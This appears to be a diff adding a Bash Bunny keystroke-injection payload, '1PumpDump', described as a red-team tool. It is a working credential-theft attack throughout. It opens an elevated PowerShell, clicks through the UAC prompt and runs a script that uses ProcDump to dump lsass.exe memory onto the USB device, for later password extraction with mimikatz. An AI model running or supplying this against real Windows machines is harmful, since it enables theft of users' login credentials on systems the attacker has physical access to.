@@ -1,0 +1,67 @@
+#!/bin/bash
+#
+# Title:         1PumpDump
+# Author:        Anthony Siravo
+# Version:       1.0
+# Description:	 Payload utilizes ProcDump to dump lsass.exe process memory for post exploitation (mimicatz) after initial Red Team engagement.
+# Target:        Windows XP SP3+
+# Tested On:     Windows 10 Pro
+# Props:         Hak5Darren's many existing scripts and videos were main contributors
+# 
+# Prerequisites:
+# Windows Sysinternals ProcDump (procdump.exe) must be in the same folder as payload.txt
+# https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
+#
+# Payload:
+# Launches PowerShell as Administrator
+# Bypass UAC
+# Execute 1PumpDump.cmd
+# which in turn copies dump to the loot folder on the Bash Bunny.
+#
+# Adjust DELAY Statements if Target Systems are Super Slow
+#
+# LED Mapping
+# Red LED - Payload Start
+# Purple LED - Command Launch
+# Blue LED - Payload Complete
+#
+# Get the switch position 
+source bunny_helpers.sh
+
+
+LED R
+ATTACKMODE HID STORAGE
+# Set src environmental variable with propper switch value for .cmd launch
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING setx src "$SWITCH_POSITION"
+QUACK ENTER
+QUACK DELAY 1000
+
+# Launch powershell as admin
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell Start-Process cmd -Verb runAs
+QUACK ENTER
+QUACK DELAY 1000
+
+# Bypass UAC
+QUACK LEFT
+QUACK ENTER
+QUACK DELAY 1000
+
+# Start a.cmd
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\1PumpDump.cmd')"
+QUACK ENTER
+
+# Wait for a.cmd to finish and exit
+
+LED R B 500
+
+Q DELAY 6000
+Q STRING exit
+Q ENTER
+
+sync
+
+LED G
